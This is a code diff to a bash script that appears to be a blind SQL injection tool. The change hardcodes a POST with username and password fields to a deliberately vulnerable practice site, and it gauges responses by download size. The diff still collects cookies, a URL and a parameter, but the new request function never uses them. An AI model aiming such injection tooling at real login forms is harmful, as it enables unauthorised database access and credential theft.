@@ -23,7 +23,7 @@ echo "2. POST"
 read -r METHOD_CHOICE
 
 METHOD="GET"
-[[ "$METHOD_CHOICE" -eq 2 ]] && METHOD="POST"
+COOKIES=""
 
 echo "Enter the target URL: "
 read -r URL
@@ -31,14 +31,31 @@ read -r URL
 echo "Enter the parameter to test (e.g., id): "
 read -r PARAMETER
 
+if [[ "$METHOD_CHOICE" -eq 2 ]]; then
+	METHOD="POST"
+	echo "Enter cookies if any (in the format 'cookieName1=cookieValue1; cookieName2=cookieValue2') or press enter to continue without:"
+	read -r COOKIES
+fi
+
 send_request() {
-	local query="$1"
-	local injection="${PARAMETER}=${query}"
-	if [ "$METHOD" == "POST" ]; then
-		curl -s -X POST --data "$injection" "$URL" -w "%{size_download}\n" -o /dev/null
-	else
-		curl -s -G --data-urlencode "$injection" "$URL" -w "%{size_download}\n" -o /dev/null
-	fi
+    local data="uname=${1}&pass=${2}"
+    local url="http://testphp.vulnweb.com/userinfo.php"  # Replace with your actual URL if different
+    
+    # cURL command with headers from the captured request
+    curl -s -X POST "$url" \
+         -H 'Host: testphp.vulnweb.com' \
+         -H 'Cache-Control: max-age=0' \
+         -H 'Upgrade-Insecure-Requests: 1' \
+         -H 'Origin: http://testphp.vulnweb.com' \
+         -H 'Content-Type: application/x-www-form-urlencoded' \
+         -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36' \
+         -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+         -H 'Referer: http://testphp.vulnweb.com/login.php' \
+         -H 'Accept-Encoding: gzip, deflate, br' \
+         -H 'Accept-Language: es-ES,es;q=0.9' \
+         --data "$data" \
+         -w "%{size_download}\n" \
+         -o /dev/null
 }
 
 extract_length() {
@@ -201,7 +218,6 @@ list_items() {
 			;;
 	esac
 }
-
 
 list_items
 
